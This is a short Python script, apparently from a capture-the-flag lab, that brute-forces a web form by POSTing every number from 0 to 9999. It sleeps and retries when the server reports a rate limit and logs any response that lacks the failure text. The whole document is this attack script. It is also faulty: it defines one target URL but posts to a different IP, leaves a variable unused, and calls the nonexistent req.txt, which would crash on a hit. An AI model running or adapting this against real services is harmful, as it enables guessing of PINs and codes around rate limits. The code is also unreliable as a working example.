import requests
import time

file = open("output.txt", "w+")
url = 'http://10.10.161.120:8085/'
myObj = 'number='

i = 0
a = 0
while i < 10000:
    req = requests.post('http://10.10.189.41:8085/', data={'number': i})

    print('\n' + '=' * 40)
    if "rate limit execeeded" in req.text:
        time.sleep(3)

        continue
    elif "Oh no! How unlucky." not in req.text:

        file.write("The magic number was: " + str(i) + '\n' + req.txt)
        print("The magic number was: " + str(i))
        print(req.text + '\n')
    print("Request number: " + str(i))
    i += 1
    time.sleep(0)

